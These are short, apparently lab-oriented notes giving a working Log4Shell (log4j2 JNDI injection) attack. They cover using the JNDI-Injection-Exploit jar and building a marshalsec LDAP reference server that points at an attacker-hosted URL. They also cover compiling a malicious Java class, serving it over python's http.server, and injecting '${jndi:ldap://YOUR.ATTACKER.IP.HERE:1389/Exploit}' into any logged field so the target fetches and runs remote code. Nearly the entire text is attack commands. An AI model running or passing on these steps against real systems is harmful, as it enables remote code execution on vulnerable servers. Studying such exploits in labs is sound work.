get the JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar from github. (you need the already compiled one otherwise it will fail)

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'Your command'

use the rmi one based on having spring boot in the path

as a poc, you can create a file in the peter users home directory, and to confirm that it works you can run the command:

docker exec -it <docker-container-name> bash

otherwise do:

in the marshalsec dir

mvn clean package -DskipTests

java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://your.attacker.ip.addr:8000/#Exploit"

then write a malicious java class with code you want to execute. You must then compile this code with jdk 1.8.0_181 for best results

javac Exploit.java -source 8 -target 8

python3 -m http.server in the same directory as the exploit class

to get the target to execute code type in any field logged by log4j2:

${jndi:ldap://YOUR.ATTACKER.IP.HERE:1389/Exploit}
